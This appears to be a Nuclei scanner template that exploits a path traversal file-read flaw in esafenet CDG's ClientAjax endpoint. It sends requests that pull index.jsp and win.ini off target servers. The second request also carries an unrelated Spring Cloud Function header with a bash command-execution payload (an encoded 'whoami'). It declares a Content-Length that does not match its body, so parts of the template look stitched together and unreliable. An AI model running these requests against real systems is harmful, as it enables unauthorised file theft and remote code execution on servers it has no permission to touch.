id: yisaitong-ClientAjax-fileread

info:
  name: yisaitong-ClientAjax-fileread
  author: yisaitong-ClientAjax-fileread
  severity: high



variables:
  filename: "{{to_lower(rand_base(10))}}"


requests:
  - raw:
      - |
        POST /CDGServer3/ClientAjax HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        command=downclientpak&InstallationPack=../index.jsp&forward=index.jsp

      - |
        POST /CDGServer3/ClientAjax HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
        Accept-Encoding:gzip,deflate
        spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,d2hvbWFp}|{base64,-d}|{bash,-i}")
        Content-Length: 3
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

        command=downclientpak&InstallationPack=../../../../../../../../../../windows/win.ini&forward=index.jsp

    stop-at-first-match: true 
    matchers:
      - type: dsl
        condition: or
        dsl:
          - contains_all(body, 'com.esafenet.','<%@')
          - contains_all(body, '[font')



